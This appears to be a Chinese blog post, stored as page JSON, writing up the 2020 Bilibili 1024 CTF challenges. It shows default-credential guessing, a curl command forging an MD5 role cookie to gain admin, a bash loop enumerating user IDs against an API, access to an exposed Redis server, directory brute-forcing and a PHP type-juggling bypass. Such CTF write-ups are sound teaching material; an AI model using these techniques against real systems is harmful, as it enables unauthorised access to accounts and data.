{"pageProps":{"title":"Bilibili 1024 节 CTF Write Up - 宝硕博客","post":{"title":"Bilibili 1024 节 CTF Write Up","excerpt":null,"content":[["$","p",{},["比赛地址： ",["$","a",{"href":"https://security.bilibili.com/sec1024/","rel":"external nofollow noreferrer"},["https://security.bilibili.com/sec1024/"]]]],["$","h2",{"id":"t1：页面的背后是什么？"},["T1：页面的背后是什么？"]],["$","p",{},[["$","s",{},["F12 解决一切问题"]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/XrLpIf2OHs4YAxJ.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t2：真正的秘密只有特殊的设备才能看到"},["T2：真正的秘密只有特殊的设备才能看到"]],["$","p",{},["改下 UA 就行了，轻松到手"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/WPLCUHNYiE2nFwJ.png","alt":"","loading":"lazy"},[]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/83GrjFbTwJf1BHn.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t3：密码是啥？"},["T3：密码是啥？"]],["$","p",{},["看了看源码，没啥思路，最后随便试了试 ",["$","code",{},["admin"]]," ",["$","code",{},["root"]]," ",["$","code",{},["bilibili"]]," 什么的，竟然是对的。"]],["$","ul",{},[["$","li",{},["用户名 ",["$","code",{},["admin"]]]],["$","li",{},["密码 ",["$","code",{},["bilibili"]]]]]],["$","p",{},["另外，你告诉我什么是 ",["$","strong",{},["falg"]]," ？"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/eg9kBtR1aQizGYE.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t4：对不起，权限不足～"},["T4：对不起，权限不足～"]],["$","p",{},["第一次访问："]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/roVjXTfs4v8ibP5.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["第二次访问："]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/RpEsGn8c9KY16MH.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["查看源码可以发现有个 API 请求，查看请求数据得到以下信息。"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/nhF7pCTQsVYxKdj.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["role 里面的东西，贴进谷歌一搜就知道它是 ",["$","code",{},["user"]]," 的 MD5 。"]],["$","p",{},["和超级管理员相关的名字相信大家都知道，无非就是 ",["$","code",{},["admin"]]," ",["$","code",{},["Administrator"]]," ",["$","code",{},["root"]]," 之类的东西。"]],["$","p",{},["挨个试，最后发现 ",["$","code",{},["Administrator"]]," 是正确的。"]],["$","pre",{},[["$","code",{"class":"hljs shell"},["curl \"http://45.113.201.36/api/ctf/4\" --cookie \"role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=***;\""]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/gEhkmTJrnaoMwPv.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t5：别人的秘密"},["T5：别人的秘密"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/c4BjYs3nVuCpxmH.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["发现有个 API，还有个 UID。"]],["$","p",{},["最开始没想到需要从代码里面的\"初始 UID\"开始扫，浪费了我好多时间。"]],["$","pre",{},[["$","code",{"class":"hljs shell"},["for ((i=100336889;$i<9999999999;i=($i+1))); do echo -e \"[$i] \\c\" && curl \"http://45.113.201.36/api/ctf/5?uid=${i}\" -H 'User-Agent: bilibili Security Browser' -H 'Cookie: session=*****; role=ee11cbb19052e40b07aac0ca060c23ee' ; done"]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/m1Hr4u8FOJe7ycI.png","alt":"","loading":"lazy"},[]]]],["$","h2",{"id":"t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～"},["T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～"]],["$","p",{},["先扫了扫端口，发现有个 redis"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/E29tLxSiC6Qzn5O.png","alt":"","loading":"lazy"},[]]]],["$","pre",{},[["$","code",{"class":"hljs shell"},["redis-cli -h 120.92.151.189 -p 6379"]]]],["$","p",{},["登上去看看，发现了第八题的 flag 。"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/Oo5vyeEsChmSt2H.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["然后爆破下目录"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/QEnxZsg8FpiOKwm.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["有个 test.php ，访问下发现是个 JSfuck 加密，丢进浏览器里面解密下"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/G7TWPndrhqBmvAI.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["程序员最多的地方，那就肯定是 Github 了。"]],["$","p",{},["然后找到了一个仓库 ",["$","a",{"href":"https://github.com/interesting-1024/end","rel":"external nofollow noreferrer"},["interesting-1024/end"]]]],["$","p",{},["有个 ",["$","code",{},["end.php"]]]],["$","pre",{},[["$","code",{"class":"hljs php"},[["$","span",{"class":"hljs-meta"},["<?php"]],"\n\n",["$","span",{"class":"hljs-comment"},["//filename end.php"]],"\n\n",["$","span",{"class":"hljs-variable"},["$bilibili"]]," = ",["$","span",{"class":"hljs-string"},["\"bilibili1024havefun\""]],";\n\n",["$","span",{"class":"hljs-variable"},["$str"]]," = ",["$","span",{"class":"hljs-title function_ invoke__"},["intval"]],"(",["$","span",{"class":"hljs-variable"},["$_GET"]],"[",["$","span",{"class":"hljs-string"},["'id'"]],"]);\n",["$","span",{"class":"hljs-variable"},["$reg"]]," = ",["$","span",{"class":"hljs-title function_ invoke__"},["preg_match"]],"(",["$","span",{"class":"hljs-string"},["'/\\d/is'"]],", ",["$","span",{"class":"hljs-variable"},["$_GET"]],"[",["$","span",{"class":"hljs-string"},["'id'"]],"]);\n\n",["$","span",{"class":"hljs-keyword"},["if"]],"(!",["$","span",{"class":"hljs-title function_ invoke__"},["is_numeric"]],"(",["$","span",{"class":"hljs-variable"},["$_GET"]],"[",["$","span",{"class":"hljs-string"},["'id'"]],"]) ",["$","span",{"class":"hljs-keyword"},["and"]]," ",["$","span",{"class":"hljs-variable"},["$reg"]]," !== ",["$","span",{"class":"hljs-number"},["1"]]," ",["$","span",{"class":"hljs-keyword"},["and"]]," ",["$","span",{"class":"hljs-variable"},["$str"]]," === ",["$","span",{"class":"hljs-number"},["1"]],"){\n    ",["$","span",{"class":"hljs-variable"},["$content"]]," = ",["$","span",{"class":"hljs-title function_ invoke__"},["file_get_contents"]],"(",["$","span",{"class":"hljs-variable"},["$_GET"]],"[",["$","span",{"class":"hljs-string"},["'url'"]],"]);\n\n    ",["$","span",{"class":"hljs-comment"},["//文件路径猜解"]],"\n    ",["$","span",{"class":"hljs-keyword"},["if"]]," (",["$","span",{"class":"hljs-literal"},["false"]],"){\n        ",["$","span",{"class":"hljs-keyword"},["echo"]]," ",["$","span",{"class":"hljs-string"},["\"还差一点点啦～\""]],";\n    }",["$","span",{"class":"hljs-keyword"},["else"]],"{\n        ",["$","span",{"class":"hljs-keyword"},["echo"]]," ",["$","span",{"class":"hljs-variable"},["$flag"]],";\n    }\n}",["$","span",{"class":"hljs-keyword"},["else"]],"{\n    ",["$","span",{"class":"hljs-keyword"},["echo"]]," ",["$","span",{"class":"hljs-string"},["\"你想要的不在这儿～\""]],";\n}\n",["$","span",{"class":"hljs-meta"},["?>"]]]]]],["$","p",{},["然后需要构造出一个 符合 ",["$","code",{},["!is_numeric($_GET['id']) and preg_match('/\\d/is', $_GET['id']) !== 1 and intval($_GET['id']) === 1"]]," 的请求即可。"]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/mCIevr1HSMBpkdi.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["可以得到一个图片的链接 ",["$","code",{},["http://45.113.201.36/blog/imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg"]]]],["$","p",{},[["$","img",{"src":"https://s1.baoshuo.ren/2020/11/28/iXEgYzjPtH2NhQw.png","alt":"","loading":"lazy"},[]]]],["$","p",{},["这个图片的末尾就是第十个 flag 了（图中标蓝的地方）。"]]],"thumb":"https://s1.baoshuo.ren/2020/12/01/cZoPxLHXlkFSjrt.jpg","date":"2020-10-26","updated":"2020-10-26","isoDate":"2020-10-26T10:02:08.000Z","isoUpdate":"2020-10-26T10:02:08.000Z","categories":[{"name":"技术向","url":"/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"}],"tags":[{"name":"CTF","url":"/tags/CTF/"},{"name":"Bilibili","url":"/tags/Bilibili/"}],"license":null,"permalink":"https://blog.baoshuo.ren/post/bilibili-1024-ctf-write-up/","url":"/post/bilibili-1024-ctf-write-up/","prev":{"title":"USTC Hackergame 2020 Write Up","url":"/post/ustc-hackergame-2020-write-up/"},"next":{"title":"使用树莓派+nginx搭建 rtmp 直播服务","url":"/post/raspberry-pi-rtmp-live/"},"toc":{"0":{"text":"T1：页面的背后是什么？","id":"t1：页面的背后是什么？"},"1":{"text":"T2：真正的秘密只有特殊的设备才能看到","id":"t2：真正的秘密只有特殊的设备才能看到"},"2":{"text":"T3：密码是啥？","id":"t3：密码是啥？"},"3":{"text":"T4：对不起，权限不足～","id":"t4：对不起，权限不足～"},"4":{"text":"T5：别人的秘密","id":"t5：别人的秘密"},"5":{"text":"T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～","id":"t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～"}},"hasToc":true,"comments":true,"wordCount":"590 字"}},"__N_SSG":true}